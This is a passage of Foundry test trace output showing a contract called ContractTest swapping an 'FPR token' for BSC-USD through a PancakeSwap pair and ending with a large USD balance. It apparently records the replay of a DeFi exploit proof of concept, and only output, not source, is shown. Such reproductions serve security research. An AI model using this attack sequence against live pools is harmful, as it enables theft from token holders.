    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 148298628869130009035 [1.482e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 50878270186414412049 [5.087e19]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 39453683083600 [3.945e13]
    │   │   ├─ emit Sync(reserve0: 50878270186414412049 [5.087e19], reserve1: 39453683083600 [3.945e13])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 29394302055115 [2.939e13], amount0Out: 148298628869130009035 [1.482e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 28094696636678071901247 [2.809e22]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 238.34ms (5.55ms CPU time)

Ran 2 test suites in 240.94ms (471.50ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
